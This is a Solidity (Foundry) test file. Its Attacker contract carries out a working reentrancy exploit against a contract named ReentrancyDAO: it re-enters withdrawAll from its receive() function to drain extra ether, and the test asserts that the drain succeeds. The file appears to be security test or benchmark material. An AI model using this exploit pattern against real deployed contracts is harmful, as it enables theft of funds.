
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ReentrancyDAO} from "../src/ReentrancyDAO.sol";

contract TestReentrancyReentrancyDAO is Test {
    ReentrancyDAO public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ReentrancyDAO();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal < type(uint128).max / 2);

        // Give some ether to the test, attacker, and victim
        vm.deal(address(this), attackVal * 4);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(_contractUnderTest), attackVal * 2);

        // Fund the attacker and have it deposit into the victim via setupAttack
        _attacker.setupAttack{value: attackVal}(attackVal);

        // Ensure victim has at least what we're going to try to drain
        vm.deal(address(_contractUnderTest), address(_contractUnderTest).balance + attackVal * 2);

        // Run the attack
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    ReentrancyDAO public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = ReentrancyDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        require(msg.value == val, "must send val");
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into the victim so that withdrawAll will send us ether
        victim.deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // Trigger the vulnerable function
        victim.withdrawAll();

        // After reentrancy, our balance should be greater than the initial snapshot
        // by more than the single legitimate withdrawal amount, indicating reentrancy success.
        if (address(this).balance > initialSnapshot + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.withdrawAll();
        }
    }
}
